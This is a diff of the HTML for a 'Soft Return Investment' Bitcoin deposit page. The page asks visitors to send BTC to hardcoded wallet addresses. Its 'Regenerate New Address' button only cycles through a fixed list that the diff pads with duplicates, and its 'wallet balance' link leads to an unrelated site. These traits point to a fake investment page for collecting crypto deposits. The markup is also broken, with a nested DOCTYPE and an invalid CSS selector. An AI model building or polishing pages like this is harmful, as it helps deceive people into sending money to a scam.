@@ -178,24 +178,14 @@
         </div>
     </header>
 
-  <!-- Contact form -->
-<script src="https://widgets.coingecko.com/gecko-coin-price-marquee-widget.js"></script>
-<gecko-coin-price-marquee-widget locale="en" dark-mode="true" transparent-background="true" outlined="true" coin-ids="" initial-currency="usd"></gecko-coin-price-marquee-widget>
-    <!-- Contact form -->
-    <section class="gridSection contactSection">
-        <div class="contactformContainer">
-            <h1 class="sectionHeader">Send in BTC</h1>
-            <form action="#" class="contactForm">
-                
-<!DOCTYPE html>
+  <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Deposit BTC - Soft Return Investment</title>
     <style>
-        body {
-            background-color: #000000;
+        body viewport {
             color: #ffffff;
             font-family: Arial, sans-serif;
             display: flex;
@@ -234,6 +224,7 @@
 
         .wallet-box.visible {
             display: block;
+            color: white;
         }
 
         .wallet-address {
@@ -260,7 +251,7 @@
 
         .instructions {
             margin: 30px 0;
-            color: #cccccc;
+            color: white;
         }
     </style>
 </head>
@@ -269,7 +260,7 @@
         <h1>Start Your Soft Return Investment</h1>
         
         <div class="instructions">
-            <p>Enter investment amount and send BTC to your investment wallet</p>
+            <p>Enter BTC amount and send BTC to your Soft Retrun investment wallet</p>
             <input type="number" class="amount-input" placeholder="Enter BTC amount" step="0.00000001">
             <button onclick="showWallet()">Next</button>
         </div>
@@ -283,9 +274,9 @@
         <button onclick="regenerateAddress()" style="display: none;" id="regenerate-btn">Regenerate New Address</button>
 
         <div class="instructions" id="action-section" style="display: none;">
-            <p>After sending BTC, click below to verify transaction</p>
+            <p>After sending BTC, come back here and click GO TO MY WALLET BALANCE below</p>
             <a href="https://www.bv.com" target="_blank">
-                <button>Load BTC to Investment Wallet</button>
+                <button>Got to My wallet Balance</button>
             </a>
         </div>
     </div>
@@ -293,7 +284,9 @@
     <script>
         const addresses = [
             'bc1q8360ms86rq9xea0ndzzg2twhe0t5sjcact8cq7',
-            'bc1qwyh38pujgm6nzt9a4e783457lrvk0gsqampuc9'
+            'bc1qwyh38pujgm6nzt9a4e783457lrvk0gsqampuc9',
+            'bc1q8360ms86rq9xea0ndzzg2twhe0t5sjcact8cq7',
+            'bc1qwyh38pujgm6nzt9a4e783457lrvk0gsqampuc9',
         ];
         let currentAddressIndex = 0;
 
@@ -323,19 +316,6 @@
             alert('New investment address generated!');
         }
     </script>
-</body>
-</html>
-
-    <footer>
-        <div class="joinSection">
-            <div class="joinDesc">
-                <h1 class="sectionHeader">Join with us</h1>
-                <p class="sectionPara">
-                    Once you have created your account, you can purchase coins from website
-                </p>
-            </div>
-            <a href="https://www.softrinvestment.online/sign-in" class="btn primaryBtn">JOIN NOW</a>
-        </div>
 <script src="https://widgets.coingecko.com/gecko-coin-price-chart-widget.js"></script>
 <gecko-coin-price-chart-widget locale="en" dark-mode="true" transparent-background="true" outlined="true" initial-currency="zar"></gecko-coin-price-chart-widget>
         <div class="footerlinksContainer">
